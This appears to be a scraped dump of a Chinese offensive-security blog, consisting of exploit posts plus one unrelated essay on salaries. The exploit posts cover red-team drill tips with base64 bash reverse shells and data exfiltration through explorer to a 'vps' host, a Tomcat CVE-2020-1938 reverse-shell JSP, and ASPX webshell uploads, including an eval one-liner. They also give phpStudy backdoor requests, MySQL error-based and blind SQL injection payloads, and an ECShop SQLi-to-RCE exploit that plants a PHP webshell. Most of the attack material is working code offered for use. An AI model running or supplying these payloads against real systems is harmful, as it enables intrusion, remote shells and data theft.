设置强口令\n2.Redis 尽量不要开放到公网\n3.限制来源IP\n后记 1.记得躲避蜜罐, 现在身份识别蜜罐基本都是使用jsonp进行互联网身份识别, 随便抽一个蜜罐, 公网大概一百多台\n搜索结果 – FOFA网络空间测绘系统 https://fofa.so/result?q=%22var+jtoken%3D%27%22\u0026qbase64=InZhciBqdG9rZW49JyI%3D\n2.反弹shell 可以使用openssl反弹443端口, 现在厂商一般都有流量监控设备, 直接明文传输会被审查到\nReverse shell cheatsheet 多种反弹shell的命令 https://krober.biz/misc/reverse_shell.php\n3.很多时候执行命令不能有特殊符号, 比如尖角号之类的, 可以使用 base64进行传参\nbash -i \u0026gt;\u0026amp; /dev/tcp/127.0.0.1/1337 0\u0026gt;\u0026amp;1\nbase64 可以转换成\nYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx\n最终可以变成\nbash -c \u0026quot;{echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx}|{base64, -d}|{bash, -i}\u0026quot;\n4.windows机器可以使用ie浏览器带数据出来, 很多杀软不会拦截ie浏览器, unc 传输文件也可以\nfor /f %s in ('dir c:\\ /b') do explorer http://vps:8000/?%s\n\\\\vps\\share\\shell.bat\n5.针对很多时候java类漏洞, 比如反序列化, rmi, jmx, iiop等情况, 时常会遇到timeout的情况\n这里主要是没有指定hostname, 这里可以使用socat进行流量转发, 无需修改POC, 以CVE-2019-12409为例\n这里针对 ENABLE_REMOTE_JMX_OPTS 远程代码执行(CVE-2019-12409) 多说一点, 因为这个问题在所有的jmx连接中都有可能出现 这里存在一个问题, JMX Server如果在启动时没有指明hostname, 那么在客户端与服务器交互过程中, 有一步返回 stub rmiserver的过程, 其中地址可能为内网地址 通过查看报错, 可以得知内网地址, 例如 172.18.0.2 使用如下两条命令即可执行, 替换 [报错中的ip], [远程目标的ip]\n1 2 ip addr add [报错中的ip]/24 dev lo socat tcp4-listen:18983, bind=[报错中的ip], reuseaddr, fork tcp4-connect:[远程目标的ip]:18983 6.Java 反序列化是这两年的重中之重, 如果有shell出不来可以参考以下链接\n深入理解JAVA反序列化漏洞 | 漏洞盒子 | 互联网安全测试众测平台 https://www.vulbox.com/knowledge/detail/?id=11\ntomcat不出网回显连续剧第六集 – 先知社区 https://xz.aliyun.com/t/7535\nWeblogic T3/iiop 构造有回显exp方案分析 – 先知社区 https://xz.aliyun.com/t/7489\nweblogic IIOP漏洞的回显构造研究 – 先知社区 https://xz.aliyun.com/t/7393\nlinux下java反序列化通杀回显方法的低配版实现 – 先知社区 https://xz.aliyun.com/t/7307\n照弹不误:出站端口受限环境下反弹Shell的思考 – FreeBuf互联网安全新媒体平台 https://www.freebuf.com/vuls/232544.html\n如何绕过高版本JDK限制进行JNDI注入利用 https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA\nJosephTribbianni/JNDI: JNDI 注入利用工具 https://github.com/JosephTribbianni/JNDI\n7.永远相信弱口令的力量, 文中没有提到的 mysql, mssql, rdp, ssh, docker-api, 大数据平台相关组件或者更多常见不常见服务, 很多都是弱口令/未授权一把梭的问题 最后祝大家 开局有0day, 处处弱口令\n","date":"2020-04-24T16:28:37Z","image":"https://w.wallhaven.cc/full/7p/wallhaven-7ploe9.png","permalink":"https://360rce.github.io/p/bw9pj09k/","title":"2020攻防演练弹药库-您有主机上线请注意"},{"content":"0x01 漏洞影响 Apache Tomcat 9.x \u0026lt; 9.0.31 Apache Tomcat 8.x \u0026lt; 8.5.51 Apache Tomcat 7.x \u0026lt; 7.0.100 Apache Tomcat 6.x 0x02 前提 目标机器开启AJP Connector 服务端口（默认开启，为8009端口） 0x03 文件读取\u0026amp;文件包含RCE 文件读取 1 py -2 \u0026#34;Tomcat-ROOT路径下文件读取(CVE-2020-1938).py\u0026#34; -p 8009 -f /WEB-INF/web.xml 192.168.52.130 文件包含 1 py -2 \u0026#34;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py\u0026#34; -p 8009 -f /test.txt 192.168.52.130 test.txt 1 2 3 4 5 6 7 8 9 10 \u0026lt;% java.io.InputStream in = Runtime.getRuntime().exec(\u0026#34;ping mdd7e.dnslog.cn\u0026#34;).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\u0026#34;\u0026lt;pre\u0026gt;\u0026#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;); %\u0026gt; 0x04 反弹shell shell.txt 1 2 3 4 5 6 7 8 9 10 \u0026lt;% java.io.InputStream in = Runtime.getRuntime().exec(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjE0My84OTg5IDA+JjE=}|{base64,-d}|{bash,-i}\u0026#34;).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\u0026#34;\u0026lt;pre\u0026gt;\u0026#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;); %\u0026gt; 0x05 参考链接 http://www.svenbeast.com/post/fqSI9laE8/\n","date":"2020-02-22T16:43:33Z","image":"https://w.wallhaven.cc/full/rr/wallhaven-rr629w.png","permalink":"https://360rce.github.io/p/4qx86up5/","title":"Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）"},{"content":"前几天在驻场时候遇到一个套娃的站，一个站里面套了N多个站，域名相同，根据不同的子目录进行区分，由于现在已经修复了，只能尽量还原当时的场景来写这文章。\n网站上传点对上传的文件进行了二次渲染，此处无法绕过，只能寻找其他突破口（因为套了不少站，浪费大量时间）。\n翻功能的时候，在一个站点找到这么一个编辑器，是不是很眼熟。\n通过fd抓包获取到编辑器路径为：\nhttps://xxx.xxx.com.cn/crm9000/HtmlControl/ueditor1.4.3.3/\n果断用exp去打，结果访问漏洞地址的时候，发现404。\n查看上传功能，发现上传功能也无法正常使用，提示后端配置项无法正常加载。\n查看配置文件，感觉也没有问题呀，此时有点郁闷。\n在牧马大佬的提示下，仔细查看js和流量。首先查看js，发现此处加载了一个Add.js文件。\n打开这个js文件，找到了ueditor的真实路径。\n但是去访问的时候，发现地址无法访问。\n通过查看加载编辑器时的网络包，可以看到这也是后端配置项无法正常加载的原因。\n然后尝试直接拼接编辑器路径到域名上，发现访问成功，原来是开发配置得有问题，多加了端口。\n既然能够正常访问，那我就不客气了，拿exp干他，先在服务器上丢个aa.jpg的一句话马。\n上传成功，返回的路径为：upload/image/201912/11/6371165485276351045218627.aspx（记住这个该死的路径，等下要懵逼。）\n接下来就是寻找路径了，我tm找了半个多小时呀，拼接了各种路径，都没找到。。。\n后来实在无奈，继续去查看配置文件，看到配置文件的时候，人是懵逼的，路径是对的呀，但感觉总有哪里不对劲。\n然后不信这个邪，又重新上传了一次，发现此时返回的路径是\nupload/image/20191211/6371165520599596974371346.aspx\n仔细一看，第一次返回的路径中多了\u0026rsquo;/\u0026rsquo;，感情是服务端返回了一个假路径给我，难怪配置文件看着哪里不对劲，原来是路径规则。\n但是访问shell的时候，报了一个错，第一次遇到这种问题。\n直接在aa.jpg里面加上\u0026lt;head runat=\u0026quot;server\u0026quot; /\u0026gt;，再上传，浏览器访问的时候就正常了，但是菜刀连接的时候，又报了这一堆东西（同事复现的时候，菜刀直接连接成功，佛学）。\n1 2 3 4 \u0026lt;head\u0026gt; \u0026lt;link href=\u0026#34;../../../../../../../App_Themes/default/default.css\u0026#34; type=\u0026#34;text/css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt;\u0026lt;link href=\u0026#34;../../../../../../../App_Themes/green/EnStyle.css\u0026#34; type=\u0026#34;text/css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt;\u0026lt;link href=\u0026#34;../../../../../../../App_Themes/green/Style.css\u0026#34; type=\u0026#34;text/css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt;\u0026lt;title\u0026gt; \u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; 继续把这些加到aa.jpg内容里，最后，aa.jpg内容为：\n1 2 3 4 5 6 \u0026lt;head runat=\u0026#34;server\u0026#34; /\u0026gt; \u0026lt;link href=\u0026#34;../../../../../../../App_Themes/default/default.css\u0026#34; type=\u0026#34;text/css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt;\u0026lt;link href=\u0026#34;../../../../../../../App_Themes/green/EnStyle.css\u0026#34; type=\u0026#34;text/css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt;\u0026lt;link href=\u0026#34;../../../../../../../App_Themes/green/Style.css\u0026#34; type=\u0026#34;text/css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt;\u0026lt;title\u0026gt; \u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;%@ Page Language=\u0026#34;Jscript\u0026#34;%\u0026gt;\u0026lt;%eval(Request.Item[\u0026#34;g\u0026#34;],\u0026#34;unsafe\u0026#34;);%\u0026gt; 上传成功后，菜刀连接成功。\n","date":"2019-12-11T09:19:25Z","image":"https://w.wallhaven.cc/full/jx/wallhaven-jxdvpp.png","permalink":"https://360rce.github.io/p/ym1ku8fe/","title":"佛学的魔改.net Ueditor"},{"content":"很久没发文章了，一个是因为忙，另一个就是不知道发什么，这次遇到一个上传觉得挺有意思的，就分享一下思路。 在客户现场驻场遇到的站点，我们乙方在挖洞的同时，甲方也有十多个人在同步挖洞。我们少挖到洞还要找我们麻烦，欲哭无泪，太难了。 当时通过另外一个漏洞getshell，还在暗自高兴的时候，翻目录的时候，看到一个TempFile的目录下有个名为shell.aspx的文件，文件上传时间在目标给我们的前几个小时（客户在给我们目标前，就让甲方的渗透人员先测试了），此时的我笑容逐渐消失，意识到问题的严重性。\n看到TempFile的目录，猜测是通过上传功能上传上来的。然后在后台找了许久，还好功能不多，找到了上传的功能点（之前这个功能点因为浏览器不兼容的原因，无法使用，后来使用ie才能够正常使用）。\n上传点在一个上传附件的地方，上传图片，拦截到此数据包发送到repeater模块。 修改数据包，可以发现上传成功，但是并不知道真实路径，文件的访问路径为：http://xxx.com:port/File/DownLoadFile/22c84d83-d9cf-dd7b-0dd1-ea72ddddd18b。 经过长时间的测试，uploadUserNo参数中加上//会导致报错，可以看到文件真实路径(getshell后发现uploadUserNo参数的值会和文件名进行拼接，例如：uploadUserNo参数值为dd//时，文件名为：dd//_年月日时分秒四位随机数_上传文件名，因为文件名不允许有//等特殊字符，所以会报错)。 此时知道文件目录为TempFile，文件名随机重命名，能够看到其命名规则为【_年月日时分秒四位随机数_上传文件名】 与电脑时间同步上传，可能秒数会有偏差，假设为偏差间隔为3秒，加上四位随机数字。 重新上传一次文件，记录上传时间为：“2019年11月27日16时19分11秒”。然后构造数据包进行爆破。 设置第一个标志位 设置第二个标志位加载生成的0000-9999的4位数字典 经过一段时间后爆破成功。 访问会报错，但问题不大，拿shell客户端直接连接 Getshell成功 ","date":"2019-11-27T17:06:13Z","image":"https://w.wallhaven.cc/full/p9/wallhaven-p97q3p.jpg","permalink":"https://360rce.github.io/p/iqi0ucr4/","title":"记一次任意文件上传"},{"content":"请求任意后缀为php的文件\n目标环境为php5.2,5.4,且不能为nts\n存在Accept-Encoding: gzip,deflate\n此处填写base64加密后的payload：accept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw\nPayLoad:\n1 2 3 4 5 6 7 8 9 10 GET /phpinfo.php HTTP/1.1 Host: 192.168.1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27 Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Sec-Fetch-Site: none, accept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw Accept-Encoding: gzip,deflate Accept-Language: zh-CN,zh;q=0.9 其他更好玩的思路靠自己去思考\n","date":"2019-09-24T18:15:12Z","image":"https://w.wallhaven.cc/full/3l/wallhaven-3l2k7y.png","permalink":"https://360rce.github.io/p/9k574hdx/","title":"phpstudy后门利用方法及getshell"},{"content":"在学生时代感觉月薪一万好高，总觉得有1万元可以干很多事情，可以去旅游，可以买电脑啊，可以买零食等等\n等工作，到手工资又一万了，反而感觉不高了。\n这是一个正常的现象，这是很多大学生进入社会最深切的感受。\n因为的你的生活水平变了，消费水平变高了，自然而然的对收入的要求也变高了。\n俗话说的好，由俭入奢易，由奢入俭难。\n一.学生时代的你\n以前上学生活费都是家里给的，根本不会有经济压力，没钱了，就能够朝父母要。\n况且给到手的钱都是实实在在的零花钱。\n千把块一共就这么点还能花很长时间，所以毕业前感觉月薪一万很高。\n学生时代的时候住的是宿舍，吃的是食堂，没有其他的大花销。在上学的时候交学费有父母，也体会不到赚钱的辛苦。\n一般学校的宿舍住宿费都是一年一交，差不多都是1200左右一年，算下来只要100块钱一个月，更何况住宿费还是包含在学费里面，根本不用另外交。\n学校的食堂吃饭荤菜3块-4块左右一个，蔬菜1块钱一个，一餐只要8块钱左右就已经能够满足日常基本需求，\n一天基本算下来是早餐4元+中餐8元+晚餐8元，总共加起来20元就能活一天。\n特别是在学生时代买新衣服和鞋子父母还会另外给钱。一个月除了吃饭日常花销600元，剩下的钱就能够出去改善伙食或者玩。\n这种时候要是给你一万块钱，那肯定是很高，想买啥就买啥，想吃啥就吃啥，你当然会觉得月薪一万块好高。\n二.毕业以后的你\n1.固定开支大\n每个月都会有固定的开支，房租，水电费，一日三餐，交通费，这些几乎都是固定开支。\n这些钱都是要靠你自己的工资去支付。在社会上已经没有学校那么廉价的宿舍了，在外租房每个月都需要支出1500元以上，已经抵得上在学生时代一个月的生活费。\n还有出社会以后也没有了那么便宜的食堂，一日三餐，最少花费早餐5元+午餐外卖15元+晚餐15元，一个月光吃饭最省都要1050元。\n还有每日上班的交通费最少10元。一个月下来就最日常的食住行就要花费3000元左右。\n2.社交开支少不了\n工作后还少不了社交活动，比如说：与同事出去聚餐，基本开支的最少也要200元左右吧，\n就算去路边的夜排挡开支也要100多以上，如果还有娱乐节目，去唱歌KTV，喝喝酒买几瓶饮料也是不少的费用.\n当然了，邀请女生去看电影，吃饭、买饮料零食，送来回路程，这些费用也是需要花费的.\n3.日常生活水平也提高\n工作以后日常生活水平肯定也是提高的。逛街买衣服，衣服也越来越注重品牌，以前你可能一身衣服几百块，现在一身动不动就上千块。\n4.人情世故少不了\n在社会上，还少不了人情世故。学生的时候因为还没赚钱，朋友圈也没有到婚丧嫁娶的年纪，也没人会计较你给没给礼钱。\n但是工作了就不一样了，朋友圈里面结婚、生孩子的也不少了。你就得各种凑份子钱，这也是一大笔的开销。\n网友也在网络上各种调侃，过个五一、过个十一就得花费一个月甚至2个月的工资在礼金上，都快活不下去，要吃土了。\n这样一对比下来一万块钱的工资还不如在学生时代的1000块钱经花。\n因为生活质量提高了，钱花的也就快了，所以你感觉一万块几乎不够你用的了，就会觉得一万的工资也不高。\n因此要想能够省下来钱，一种是降低你生活水平，减少日常花销。另外一种是提升自己的综合实力赚更多的钱。\n","date":"2019-09-20T11:00:36Z","image":"https://w.wallhaven.cc/full/vq/wallhaven-vqeg9m.png","permalink":"https://360rce.github.io/p/nl8dq2do/","title":"莫名的感慨"},{"content":"概念： SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。\nMYSQL报错注入分类： BIGINT等数据类型溢出\nxpath语法错误\nconcat+rand()+group_by()导致主键重复\n一些特性\n下面就针对这几种错误类型看看背后的原理是怎样的。\nBIGINT等数据类型溢出 按位取反~、!、exp()来溢出报错。\n有版本限制，mysql\u0026gt;5.5.53时，则不能返回查询结果。\n1 select exp(~(select*from(select user())x)); 1 select (select(!x-~0)from(select(select user())x)a); 报错信息是有长度限制的，在mysql/my_error.c中可以看到\nxpath报错 通过xml函数进行报错，来进行注入。主要涉及2个函数:\n1、updatexml()\n2、extractvalue()\n它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里。这就是xpath报错注入的原理\nupdatexml报错注入 updatexml((XML_document, XPath_string, new_value):\n第一个参数：xml文档的名称\n第二个参数：xpath格式的字符串\n第三个参数：替换查找到的符合条件的数据\n注意事项 必须是在xpath那里传特殊字符，mysql才会报错，而我们又要注出数据，没这么多位置，所以要用到concat函数 xpath只会对特殊字符进行报错，这里我们可以用~，16进制的0x7e来进行利用 xpath只会报错32个字符，所以要用到substr Payload 爆数据库版本 1 updatexml(1,concat(0x7e,version(),0x7e),1) 爆所有数据库 1 updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),1,32) from information_schema.schemata)),0x7e) 但是报错长度有限制，可以使用limit来偏移\n1 updatexml(1,concat(0x7e,(select substr(schema_name,1,32) from information_schema.schemata limit 4,1)),0x7e) 爆所有表 1 updatexml(1,concat(0x7e,(select substr(group_concat(table_name),1,32) from information_schema.tables where table_schema=database()),0x7e),1) 爆所有列 1 updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,32) from information_schema.columns where table_schema=database()),0x7e),1) 爆数据 1 updatexml(1,concat(0x7e,(select substr(group_concat(username),1,32) from users),0x7e),1) Extractvalue报错注入 extractvalue(xml_str , Xpath) 第一个参数意思是传入xml文档，第二个参数xpath意思是传入文档的路径\n还是对第二个参数xpath传入特殊字符，让它报错，跟updatexml的payload差不多，只不过一个是3个参数，一个是两个，这里就不详细列出来了\n1 extractvalue(1,concat(0x7e,version(),1)) 主键重复 1 2 mysql\u0026gt; select count(*) from user group by concat(version(),floor(rand(0)*2)); ERROR 1062 (23000): Duplicate entry \u0026#39;5.1.60-community-log1\u0026#39; for key \u0026#39;group_key\u0026#39; 1 2 mysql\u0026gt; select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2)); ERROR 1062 (23000): Duplicate entry \u0026#39;root@localhost1\u0026#39; for key \u0026#39;group_key\u0026#39; 只要是count，rand()，group by三个连用就会造成这种报错，与位置无关。\n函数特性报错 在版本号为5.5.47上可以用来注入，而在5.7.17上则不行\ngeometrycollection() 1 and geometrycollection((select * from(select * from(select user())a)b))-- + multipoint() 1 and multipoint((select * from(select * from(select user())a)b))-- + polygon() 1 and polygon((select * from(select * from(select user())a)b))-- + multipolygon() 1 and multipolygon((select * from(select * from(select user())a)b))-- + linestring() 1 and linestring((select * from(select * from(select user())a)b))-- + multilinestring() 1 and multilinestring((select * from(select * from(select user())a)b))-- + 小tips 过滤information_schema 如果程序过滤information_schema，无法获取表名，利用polygon()进行绕过，括号里填上存在的列名(一般都有id这个列)，即可爆出表名\n","date":"2019-08-14T14:02:34Z","image":"https://w.wallhaven.cc/full/2y/wallhaven-2yop8y.png","permalink":"https://360rce.github.io/p/yyvork8r/","title":"SQL注入学习之MYSQL报错注入"},{"content":"概念： 如果每个应用程序都能按照我们输入的 SQL 命令返回我们需要的数据，那应用程序就无安全性可言了！为此，程序设计者们想到一个办法，那就是无论输入何种命令，只要 SQL 语句导致数据库产生错误，那么应用程序就会返回一个“通用的”的页面，或者重定向一个通用页面（可能为网站首页）。这时，回显方式的 SQL 注入办法就无法使用了。盲注，即在 SQL 注入过程中，SQL 语句执行选择后，选择的数据不能回显到前端，需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。\n盲注分为两类： 一、 基于布尔型 SQL 盲注；\n• 基于布尔型 SQL 盲注即在 SQL 注入过程中，应用程序仅仅返回 True（页面）和 False（页面）。\n• 无法根据应用程序的返回页面得到需要的数据库信息。但是可以通过构造逻辑判断（比较大小）来得到需要的信息。\n二、 基于时间型 SQL 盲注；注入 SQL 代码之后，存在以下两种情况：\n• 如果注入的 SQL 代码不影响后台[数据库]的正常功能执行，那么 Web 应用的页面显示正确（原始页面）。\n• 如果注入的 SQL 代码影响后台数据库的正常功能（产生了 SQL 注入），但是此时Web 应用的页面依旧显示正常（原因是 Web 应用程序采取了“重定向”或“屏蔽”措施）。\n产生一个疑问：注入的 SQL 代码到底被后台数据库执行了没有？即 Web 应用程序是否存在 SQL 注入？\n面对这种情况，之前讲的基于布尔的 SQL 盲注就很难发挥作用了（因为基于布尔的 SQL 盲注的前提是 Web 程序返回的页面存在 true 和 false 两种不同的页面）。这时，一般采用基于 web 应用响应时间上的差异来判断是否存在 SQL 注入，即基于时间型 SQL 盲注。\n基于布尔的盲注 在页面中，如果正确执行了SQL语句，则返回一种页面，如果SQL语句执行错误，则执行另一种页面。基于两种页面，来判断SQL语句正确与否，达到获取数据的目的\nPayload 网上的payload一般是利用ascii()、substr()、length()结合进行利用\n获取数据库长度 1 and (select length(database()))=长度 大于7返回正常\n大于8返回错误\n等于8返回正常，说明数据库长度为8\n逐字猜解数据库名 1 and (select ascii(substr(database(),位数,1)))=ascii码 ASCII对照表\nASCII值 控制字符 ASCII值 控制字符 ASCII值 控制字符 ASCII值 控制字符 0 NUT 32 (space) 64 @ 96 、 1 SOH 33 ! 65 A 97 a 2 STX 34 \u0026quot; 66 B 98 b 3 ETX 35 # 67 C 99 c 4 EOT 36 $ 68 D 100 d 5 ENQ 37 % 69 E 101 e 6 ACK 38 \u0026amp; 70 F 102 f 7 BEL 39 , 71 G 103 g 8 BS 40 ( 72 H 104 h 9 HT 41 ) 73 I 105 i 10 LF 42 * 74 J 106 j 11 VT 43 + 75 K 107 k 12 FF 44 , 76 L 108 l 13 CR 45 - 77 M 109 m 14 SO 46 . 78 N 110 n 15 SI 47 / 79 O 111 o 16 DLE 48 0 80 P 112 p 17 DCI 49 1 81 Q 113 q 18 DC2 50 2 82 R 114 r 19 DC3 51 3 83 S 115 s 20 DC4 52 4 84 T 116 t 21 NAK 53 5 85 U 117 u 22 SYN 54 6 86 V 118 v 23 TB 55 7 87 W 119 w 24 CAN 56 8 88 X 120 x 25 EM 57 9 89 Y 121 y 26 SUB 58 : 90 Z 122 z 27 ESC 59 ; 91 [ 123 { 28 FS 60 \u0026lt; 92 / 124 | 29 GS 61 = 93 ] 125 } 30 RS 62 \u0026gt; 94 ^ 126 ` 31 US 63 ? 95 _ 127 DEL 数据库第一位字符ASCII码为114返回错误\n数据库第一位字符ASCII码为115返回正确，说明数据库第一位字符为s\n数据库第二位字符ASCII码为100返回错误\n数据库第二位字符ASCII码为101返回正确，说明数据库第二位字符为e\n\u0026hellip;..\n1 ?id=1\u0026#39; and (select ascii(substr(database(),8,1)))=121 --+ 以此类推，最后得到数据库为security\n猜解表名数量 1 and (select count(table_name) from information_schema.tables where table_schema=database())=数量 猜解某个表长度 使用limit偏移，n从0开始\n1 and (select length(table_name) from information_schema.tables where table_schema=database() limit n,1)=长度 第4个表长度为5\n逐位猜解表名 1 and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema = database() limit n,1)=ascii码 第4个表第一位ascii码为116报错\n第4个表第一位ascii码为117正确，说明第4个表第一位为u\n\u0026hellip;.\n以此类推，最后得到第4个表表名为users\n猜解列名数量 1 and (select count(*) from information_schema.columns where table_schema = database() and table_name = 表名)=数量 users表列名数量为3\n猜解某个列长度 使用limit偏移，n从0开始\n1 and (select length(column_name) from information_schema.columns where table_name=\u0026#39;表名\u0026#39; limit n,1)=长度 逐位猜解列名 1 and (select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name=\u0026#34;表名\u0026#34; limit n,1)=ascii码 判断数据的数量 1 and (select count(列名) from 表名)=数量 猜解某条数据的长度 1 and (select length(列名) from admin limit n,1)=长度 逐位猜解数据 1 and (select ascii(substr(user,位数,1)) from admin limit n,1)=ascii码 基于时间的盲注 布尔盲注是根据页面正常否进行注入，而时间盲注则是通过SQL语句查询的时间来进行注入,一般是在页面无回显，无报错的情况下使用\nPayload 网上的payload一般是利用sleep()进行利用\n猜解数据库长度 1 and if((select length(database()))=长度,sleep(6),0) 猜解数据库名 1 and if((select ascii(substr(database(),位数,1))=ascii码),sleep(6),0) 判断表名的数量 1 and if((select count(table_name) from information_schema.tables where table_schema=database())=个数,sleep(6),0) 判断某个表名的长度 1 and if((select length(table_name) from information_schema.tables where table_schema=database() limit n,1)=长度,sleep(6),0) 逐位猜表名 1 and if((select ascii(substr(table_name,位数,1)) from information_schema.tables where table_schema=database() limit n,1)=ascii码,sleep(6),0) 判断列名数量 1 and if((select count(column_name) from information_schema.columns where table_name=\u0026#34;表名\u0026#34;)=个数,sleep(6),0) 判断某个列名的长度 1 and if((select length(column_name) from information_schema.columns where table_name=\u0026#34;表名\u0026#34; limit n,1)=长度,sleep(6),0) 逐位猜列名 1 and if((select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name=\u0026#34;表名\u0026#34; limit n,1)=ascii码,sleep(6),0) 判断数据的数量 1 and if((select count(列名) from 表名)=个数,sleep(6),0) 判断某个数据的长度 1 and if((select length(列名) from 表名)=长度,sleep(6),0) 逐位猜数据 1 and if((select ascii(substr(列名,n,1)) from 表名)=ascii码,sleep(6),0) ","date":"2019-08-13T11:06:36Z","image":"https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg","permalink":"https://360rce.github.io/p/wto41ytz/","title":"SQL注入学习之MYSQL盲注"},{"content":"前言 问题发生在user.php的display函数，模版变量可控，导致注入，配合注入可达到远程代码执行\n漏洞分析 0x01-SQL注入 先看user.php\n$back_act变量来源于HTTP_REFERER，我们可控。\nassign函数用于在模版变量里赋值\n再看display函数\n读取user_passport.dwt模版文件内容，显示解析变量后的html内容，用_echash做分割，得到$k然后交给isnert_mod处理，由于_echash是默认的，不是随机生成的，所以$val内容可随意控制。\n再看insert_mod函数\n非常关键的一个地方，这里进行了动态调用\n$val传入进来用|分割，参数传入进来时需要被序列化\n再看include/lib_insert.php中的insert_ads函数\n可以看到这里直接就能注入了\npayload:\n1 2 3 4 5 6 7 8 9 10 GET /user.php?act=login HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1 Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\u0026#34;num\u0026#34;;s:72:\u0026#34;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -\u0026#34;;s:2:\u0026#34;id\u0026#34;;i:1;} Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 0x02-代码执行 继续看fetch函数\n追踪_eval函数\n$position_style变量来源于数据库中的查询结构\n然后我们继续构造SQL注入，因为这段sql操作 order by部分换行了截断不了 所以需要在id处构造注释来配合num进行union查询\npayload\n1 SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd FROM `ecshop27`.`ecs_ad` AS a LEFT JOIN `ecshop27`.`ecs_ad_position` AS p ON a.position_id = p.position_id WHERE enabled = 1 AND start_time \u0026lt;= \u0026#39;1535678679\u0026#39; AND end_time \u0026gt;= \u0026#39;1535678679\u0026#39; AND a.position_id = \u0026#39;\u0026#39;/*\u0026#39; ORDER BY rnd LIMIT */ union select 1,2,3,4,5,6,7,8,9,10-- - 函数中有一个判断\n我们 id传入’/*\nnum传入*/ union select 1,0x272f2a,3,4,5,6,7,8,9,10– -就能绕过了\nvar_dump一下\n再看fetch函数,传入的参数被fetch_str函数处理了\n追踪fetch_str函数，这里的字符串处理流程比较复杂\n1 return preg_replace(\u0026#34;/{([^\\}\\{\\n]*)}/e\u0026#34;, \u0026#34;\\$this-\u0026gt;select(\u0026#39;\\\\1\u0026#39;);\u0026#34;, $source); 这一行意思是比如$source是xxxx{$asd}xxx,那么经过这行代码处理后就是返回this-\u0026gt;select(‘$asd’)的结果\n看看select函数\n第一个字符为$时进入$this-\u0026gt;get_val函数\n我们$val没有.$又进入make_var函数\n最后这里引入单引号从变量中逃逸\n我们要闭合_var所以最终payload是\n1 {$asd\u0026#39;];assert(base64_decode(\u0026#39;ZmlsZV9wdXRfY29udGVudHMoJzEudHh0JywnZ2V0c2hlbGwnKQ==\u0026#39;));//}xxx 会在网站跟目录生成1.txt 里面内容是getshell\nGETSHELL exp:\n1 2 3 4 5 6 7 8 9 10 GET /user.php?act=login HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1 Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\u0026#34;num\u0026#34;;s:280:\u0026#34;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -\u0026#34;;s:2:\u0026#34;id\u0026#34;;s:3:\u0026#34;\u0026#39;/*\u0026#34;;} Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 会在网站根目录生成1.php 